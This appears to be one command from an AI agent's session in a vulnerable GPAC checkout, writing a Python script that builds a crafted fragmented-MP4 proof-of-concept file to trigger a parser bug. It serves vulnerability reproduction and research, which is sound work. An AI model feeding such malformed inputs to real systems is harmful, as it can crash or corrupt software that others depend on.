Command `cd /workspace/repo-vul/src-vul/gpac && python3 - <<'PY'
from pathlib import Path
p=Path('/tmp/poc.bin')
# minimal mp4-like with ftyp + moof/traf/trun/mdat crafted from fuzzing intuition
# start from a tiny valid-ish structure and include a fragment so READ_DUMP stores traf_map
import struct

def box(t, payload):
    return struct.pack('>I4s', 8+len(payload), t.encode()) + payload
ftyp = box('ftyp', b'isom\x00\x00\x02\x00isomiso2')
# empty moov with mvhd/trak omitted is likely invalid, but parser may still walk fragments
# create moof with mfhd+traf+tfhd+tfdt+trun and mdat
mfhd = box('mfhd', struct.pack('>I', 0) + struct.pack('>I', 1))
tfhd = box('tfhd', struct.pack('>I', 0x020000) + struct.pack('>I', 1))
tfdt = box('tfdt', struct.pack('>I', 1) + struct.pack('>Q', 0))
trun = box('trun', struct.pack('>I', 0x000001) + struct.pack('>I', 1) + struct.pack('>i', 0))
traf = box('traf', tfhd + tfdt + trun)
moof = box('moof', mfhd + traf)
mdat = box('mdat', b'AAAA')
p.write_bytes(ftyp + moof + mdat)
print(len(p.read_bytes()))
